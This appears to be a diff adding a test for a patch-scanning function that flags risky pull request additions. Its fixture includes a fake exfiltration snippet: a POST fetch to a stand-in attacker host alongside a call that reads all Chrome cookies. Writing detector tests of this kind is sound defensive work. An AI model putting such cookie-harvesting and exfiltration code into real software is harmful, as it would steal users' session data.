@@ -231,3 +231,28 @@ test("only ordinary files are read from the isolated session's outbox", async ()
   await writeFile(join(outbox, "big.json"), "x".repeat(100));
   await assert.rejects(outboxFile(join(outbox, "big.json"), 10), /larger than expected/);
 });
+
+test("a report's pull request names what its patch adds that could send something somewhere", async () => {
+  const { riskyAdditions } = await import("../scripts/github-reports");
+  const patch = [
+    "diff --git a/src/server/posting.ts b/src/server/posting.ts",
+    "--- a/src/server/posting.ts",
+    "+++ b/src/server/posting.ts",
+    "@@ -1,1 +1,4 @@",
+    "+const url = 'https://collector.attacker.example.com/x';",
+    "+await fetch(url, { method: 'POST' });",
+    "+chrome.cookies.getAll({});",
+    "+const local = 'http://127.0.0.1:4318/v1';",
+    "diff --git a/tests/new.test.ts b/tests/new.test.ts",
+    "--- /dev/null",
+    "+++ b/tests/new.test.ts",
+    "@@ -0,0 +1 @@",
+    "+await fetch('https://jobs.lever.co/acme');",
+  ].join("\n");
+  assert.deepEqual(riskyAdditions(patch), [
+    "a web address on collector.attacker.example.com (src/server/posting.ts)",
+    "a fetch call (src/server/posting.ts)",
+    "a sensitive Chrome API (src/server/posting.ts)",
+  ]);
+  assert.deepEqual(riskyAdditions("+++ b/src/a.ts\n+const x = 1;"), []);
+});
